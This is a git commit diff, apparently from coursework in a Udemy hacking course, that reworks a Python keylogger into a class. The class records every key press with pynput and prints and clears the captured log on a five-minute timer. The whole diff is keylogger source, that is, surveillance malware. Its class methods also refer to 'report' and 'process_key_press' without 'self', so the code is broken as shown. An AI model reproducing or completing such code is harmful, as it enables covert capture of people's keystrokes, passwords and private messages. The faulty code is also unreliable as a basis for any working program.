73cfb173d5a7824220700a5f6831194db821ab41
fraizerbrian <fraizerkilonzo@gmail.com>
2020-08-31 00:40:29 +0300

    added keylogger

--- udemy/keylogger/keylogger.py
+++ udemy/keylogger/keylogger.py
@@ -1,17 +1,31 @@
 #!usr/bin/env python
 import pynput.keyboard
+import threading
 
 log = ""
 
-def process_key_press(key):
-    global log
-    try:
-        log = log + str(key.char)
-    except AttributeError:
-        log = log +str(key)
-    print(log)
+class Keylogger:
+    def process_key_press(self,key):
+        global log
+        try:
+            log = log + str(key.char)
+        except AttributeError:
+            if key == key.space:
+                log = log + " "
+            else:
+                log = log + " " +str(key) + " "
+        # print(log)
 
+    # this is used to set the timer and intervals
+    def report(self):
+        global log
+        print(log)
+        log = ""
+        timer = threading.Timer(300,report)
+        timer.start()
 
-keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
-with keyboard_listener:
-    keyboard_listener.join()
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
+        with keyboard_listener:
+            report()
+            keyboard_listener.join()
